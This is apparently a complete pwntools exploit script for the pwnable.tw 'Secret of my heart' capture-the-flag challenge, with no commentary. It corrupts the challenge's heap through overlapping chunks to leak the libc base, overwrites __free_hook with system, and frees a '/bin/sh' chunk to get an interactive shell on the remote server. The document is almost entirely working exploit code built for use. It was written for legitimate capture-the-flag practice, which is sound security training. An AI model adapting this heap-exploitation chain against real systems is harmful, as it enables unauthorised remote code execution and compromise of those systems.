from pwn import *

r = remote('chall.pwnable.tw', 10302)
# r = process('./secret_of_my_heart_patched')
context.clear(os='linux', arch='x86_64', log_level='debug')
bin = ELF('./secret_of_my_heart_patched')
libc = ELF('./libc.so.6')

def add_a_secret(size, name, secret):
    r.sendlineafter(b'Your choice :', b'1')
    r.sendlineafter(b'Size of heart : ', str(size).encode())
    r.sendafter(b'Name of heart :', name)
    r.sendafter(b'secret of my heart :', secret)

def show_a_secret(index):
    r.sendlineafter(b'Your choice :', b'2')
    r.sendlineafter(b'Index :', str(index).encode())

def delete_a_secret(index):
    r.sendlineafter(b'Your choice :', b'3')
    r.sendlineafter(b'Index :', str(index).encode())

# with open('/proc/%d/maps' % r.pid, 'r') as f:
#     f.readline()
#     base = int('0x' + f.read(12), 16)
#     log.info('Base: %#x' % base)

# Leak libc
add_a_secret(0xf0, b'\n', b'\n')
add_a_secret(0x10, b'\n', b'\n')
add_a_secret(0xf0, b'\n', b'\n')
add_a_secret(0x10, b'\n', b'\n')
delete_a_secret(0)
delete_a_secret(1)
add_a_secret(0x18, b'\n', b'a'*0x10 + p64(0x120))
delete_a_secret(2)
add_a_secret(0xf0, b'\n', b'\n')
show_a_secret(0)
r.recvuntil(b'Secret : ')
libc.address = u64(r.recv(6).ljust(8, b'\x00')) - 0x3c3b78
log.success('Libc base: %#x' % libc.address)
add_a_secret(0x50, b'\n', b'Hello World')
add_a_secret(0x50, b'\n', b'Hello World')
add_a_secret(0x50, b'\n', b'Hello World')


add_a_secret(0xe0, b'\n', b'\n') # 6
add_a_secret(0x60, b'\n', b'\n')
add_a_secret(0xf0, b'\n', b'\n')
add_a_secret(0x10, b'\n', b'\n')
delete_a_secret(6)
delete_a_secret(7)
add_a_secret(0x68, b'\n', b'\x00'*0x60 + p64(0x160))
delete_a_secret(6)
delete_a_secret(8)
add_a_secret(0x100, b'\n', b'\x00'*0xe8 + p64(0x71) + p64(libc.symbols['__free_hook'] - 0x13) + p64(0))
add_a_secret(0x100, b'\n', b'\n')
add_a_secret(0x20, b'\n', b'\n')

add_a_secret(0xe0, b'\n', b'\n') # 10
add_a_secret(0x20, b'\n', b'\n')
add_a_secret(0xf0, b'\n', p64(0)*0x1c + p64(0x110) + p64(0x30))
add_a_secret(0x10, b'\n', b'\n')
delete_a_secret(10)  
delete_a_secret(11)
add_a_secret(0x28, b'\n', b'a'*0x20 + p64(0x120))
delete_a_secret(10)
delete_a_secret(12)
add_a_secret(0xf0, b'\n', b'\n')
add_a_secret(0x20, b'\n', p64(0) + p64(0x111) + p64(libc.address + 0x3c3b78) + p64(libc.symbols['__free_hook'] - 0x20))
add_a_secret(0x100, b'\n', b'\n')
add_a_secret(0x60, b'\n', b'/bin/sh\x00')
add_a_secret(0x60, b'\n', b'\x00'*3 + p64(libc.symbols['system']))
delete_a_secret(14)
r.interactive()
